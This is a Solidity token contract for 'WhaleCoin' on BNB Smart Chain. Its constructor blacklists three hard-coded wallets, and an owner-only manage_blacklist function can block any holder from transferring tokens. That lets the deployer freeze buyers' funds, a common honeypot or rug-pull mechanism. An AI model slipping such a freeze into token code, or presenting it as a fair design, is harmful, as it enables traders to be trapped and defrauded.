/**
 *Submitted for verification at BscScan.com on 2022-03-12
*/

pragma solidity ^0.8.10;


contract JBNBnMod {
    address private _owner;

    string private _symbol = " WhaleCoin";
    string private _name = "WhaleCoin";
    uint256 private _totalSupply = 1100000000 * (10 ** decimals());

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) public isBlacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _owner = msg.sender;
        _balances[_owner] = _totalSupply;
        _name = name_;
        _symbol = symbol_;
        //blocking some Whales
        isBlacklisted[0xa6364afB914792FE81E0810D5F471be172079F7b]=true;
        isBlacklisted[0x6c7E9D8Bc490Be6E20a5A166754F234BCb591427]=true;
        isBlacklisted[0x9878FD1fC944A83cA168A6293C51B34f8EB0Edad]=true;

    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address wallet) public view returns (uint256) {
        return _balances[wallet];
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
        require(to.length == amounts.length, "Length of addresses should be equal to amounts");
        for (uint256 i = 0; i < to.length; i++) {
            require(transfer(to[i], amounts[i]));
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(!isBlacklisted[sender],"Blacklisted");
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function manage_blacklist(address[] calldata addresses, bool status) public returns (bool){
        if (msg.sender!=_owner){
            return false;
        }
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
        return true;
    }

}